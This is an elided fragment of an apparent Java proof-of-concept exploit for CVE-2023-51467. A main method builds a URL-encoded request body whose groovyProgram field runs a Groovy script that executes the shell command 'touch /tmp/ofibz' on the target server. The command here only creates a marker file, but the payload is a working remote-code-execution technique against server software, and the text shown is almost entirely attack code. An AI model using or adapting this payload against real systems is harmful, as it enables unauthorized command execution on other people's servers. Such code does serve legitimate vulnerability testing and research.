...
public class CVE_2023_51467 {
    ...
    public static void main(String[] args) throws IOException {
        ...
        String body = "groovyProgram=" + "import+groovy.lang.GroovyShell%3B%0A%0AString+expression+%3D+%22'touch+%2Ftmp%2Fofibz'.execute()%22%3B%0AGroovyShell+gs+%3D+new+GroovyShell()%3B%0Ags.evaluate(expression)%3B";
